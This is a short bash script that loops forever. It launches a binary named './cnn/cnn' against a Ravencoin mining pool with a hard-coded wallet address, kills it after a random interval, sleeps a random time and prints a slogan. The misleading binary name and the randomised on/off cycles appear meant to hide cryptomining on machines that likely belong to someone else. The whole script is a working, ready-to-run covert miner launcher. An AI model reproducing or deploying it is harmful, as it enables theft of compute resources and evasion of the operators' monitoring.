while :
do

	x=$(($RANDOM%15))
	y=20
	z=$(($x+$y))

	a=$(($RANDOM%120))
	b=650
	c=$(($a+$b))

	w=$(($RANDOM%60))
	e=120
	aaram=$(($w+$e))
	timeout -k 5 $c\s   ./cnn/cnn -P stratum+ssl://RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc.worker:pps@us.ravenminer.com:13802 -U
	timeout -k 5 2s pgrep cnn | xargs kill
	sleep $aaram
	echo "Kartik Bhai Amar Rahe"
done
